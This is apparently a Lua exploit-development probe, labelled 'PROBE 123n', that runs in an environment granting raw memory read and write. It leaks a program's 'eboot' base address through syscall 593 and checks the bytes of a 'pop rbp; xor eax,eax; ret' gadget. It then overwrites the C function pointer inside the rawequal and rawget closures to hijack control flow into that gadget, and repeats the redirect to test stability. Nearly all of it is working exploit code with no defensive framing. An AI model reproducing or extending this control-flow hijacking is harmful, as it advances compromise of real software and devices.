-- CRASH_CLASS: LOW
-- PROBE 123n: Test compound gadget (pop rbp; xor eax,eax; ret)
--
-- Confirms eboot+0x0DBF40 returns cleanly via CClosure redirect.
-- Then tests stability over multiple rounds.
-- Also: after compound call, test if rbp persists across calls by
-- redirecting to mov [rdi],rax;ret — if rdi happens to point somewhere
-- writable, we can observe the write.
--
-- Stack layout at gadget entry:
--   [rsp+0] = return_addr_1 (pushed by call [fn])
--   [rsp+8] = return_addr_2 (or saved reg)
-- pop rbp loads return_addr_1 into rbp, ret goes to [rsp+8]

print("=== PROBE 123n: COMPOUND GADGET TEST ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local function get_eboot_base()
    local info = memory.alloc(0x200)
    safe_wd(info, 0x160)
    local sc_info = make_syscall(593)
    pcall(function() sc_info(uint64(0), info) end)
    local lo = safe_rd(info + 0x108)
    local hi = safe_rd(info + 0x10C)
    if lo and hi then
        return uint64(string.format("0x%X%08X", hi, lo)), hi, lo
    end
    return nil, 0, 0
end

collectgarbage("stop")

local eboot_base, eboot_hi, eboot_lo = get_eboot_base()
print(string.format("[*] eboot: 0x%08X_%08X", eboot_hi, eboot_lo))
if not eboot_base then print("ABORT") return end

local function ea(off)
    local lo = eboot_lo + off
    local hi = eboot_hi
    if lo >= 0x100000000 then hi = hi + 1; lo = lo - 0x100000000 end
    return uint64(string.format("0x%X%08X", hi, lo))
end

-- Verify compound bytes: expect 5D 31 C0 C3 at +0x0DBF40
local cmp_dw = safe_rd(ea(0x0DBF40))
print(string.format("[*] eboot+0x0DBF40 bytes: 0x%08X (expect 0xC3C0315D)", cmp_dw or 0))
if cmp_dw ~= 0xC3C0315D then
    print("[!] UNEXPECTED BYTES — aborting")
    return
end
print("[*] Compound gadget bytes verified: pop rbp; xor eax,eax; ret")

-- Verify xor eax,eax;ret baseline still works
local xor_dw = safe_rd(ea(0x471))
print(string.format("[*] eboot+0x471 bytes: 0x%08X", xor_dw or 0))

-- Get CClosure address from rawequal
local re_str = tostring(rawequal)
print("[*] rawequal: " .. re_str)
local fn_hex = re_str:match("0x[0-9a-fA-F]+") or re_str:match("%s([0-9a-fA-F][0-9a-fA-F][0-9a-fA-F]+)")
if not fn_hex then print("ABORT: no fn addr") return end
if not fn_hex:match("^0x") then fn_hex = "0x" .. fn_hex end

local fn_addr = uint64(fn_hex)
local fn_hi, fn_lo = get_hi_lo(fn_addr)
print(string.format("[*] CClosure addr: 0x%X%08X", fn_hi, fn_lo))

-- Read original +0x20 (the C function pointer)
local orig_q = safe_rq(fn_addr + 0x20)
local orig_hi, orig_lo = get_hi_lo(orig_q)
print(string.format("[*] Original +0x20: 0x%X%08X", orig_hi, orig_lo))

-- === SECTION A: xor eax,eax;ret baseline ===
print("")
print("--- A: xor eax,eax;ret baseline ---")
local xor_addr = ea(0x471)
safe_wq(fn_addr + 0x20, xor_addr)
local ok, r1 = pcall(rawequal, 1, 2)
safe_wq(fn_addr + 0x20, orig_q)
print(string.format("  ok=%s r1=%s type=%s", tostring(ok), tostring(r1), type(r1)))

-- === SECTION B: compound gadget — single call ===
print("")
print("--- B: compound (pop rbp; xor eax,eax; ret) x1 ---")
local compound_addr = ea(0x0DBF40)
safe_wq(fn_addr + 0x20, compound_addr)
local ok2, r2 = pcall(rawequal, 1, 2)
safe_wq(fn_addr + 0x20, orig_q)
print(string.format("  ok=%s r1=%s type=%s", tostring(ok2), tostring(r2), type(r2)))

-- === SECTION C: compound x5 stability ===
print("")
print("--- C: compound x5 stability ---")
local all_ok = true
for i = 1, 5 do
    safe_wq(fn_addr + 0x20, compound_addr)
    local ok_i, r_i = pcall(rawequal, 1, 2)
    safe_wq(fn_addr + 0x20, orig_q)
    if not ok_i then all_ok = false end
    print(string.format("  [%d] ok=%s r1=%s", i, tostring(ok_i), tostring(r_i)))
end
print(string.format("  All ok: %s", tostring(all_ok)))

-- === SECTION D: compound on rawget too ===
print("")
print("--- D: compound on rawget ---")
local rg_str = tostring(rawget)
print("[*] rawget: " .. rg_str)
local rg_hex = rg_str:match("0x[0-9a-fA-F]+") or rg_str:match("%s([0-9a-fA-F][0-9a-fA-F][0-9a-fA-F]+)")
if rg_hex then
    if not rg_hex:match("^0x") then rg_hex = "0x" .. rg_hex end
    local rg_addr = uint64(rg_hex)
    local rg_orig = safe_rq(rg_addr + 0x20)
    safe_wq(rg_addr + 0x20, compound_addr)
    local ok3, r3 = pcall(rawget, {}, "x")
    safe_wq(rg_addr + 0x20, rg_orig)
    print(string.format("  ok=%s r1=%s type=%s", tostring(ok3), tostring(r3), type(r3)))
end

-- === SECTION E: after compound, is rawequal still functional? ===
print("")
print("--- E: rawequal functional after compound ---")
local ok4 = rawequal(1, 1)
local ok5 = rawequal(1, 2)
print(string.format("  rawequal(1,1)=%s rawequal(1,2)=%s", tostring(ok4), tostring(ok5)))

-- === SECTION F: test what Lua sees as return count ===
-- With xor eax,eax;ret we get 0 returns (nil).
-- With compound, pop rbp changes rsp, xor eax zeros eax → also 0 returns.
-- Let's call with select('#',...) wrapper to count returns
print("")
print("--- F: return count check ---")
safe_wq(fn_addr + 0x20, compound_addr)
local rets = select('#', pcall(rawequal, 1, 2))
safe_wq(fn_addr + 0x20, orig_q)
print(string.format("  pcall returns: %d values", rets))
-- pcall returns ok + N results, so if compound gives 0 results, rets=1 (just ok)

print("")
print("=== PROBE 123n COMPLETE ===")
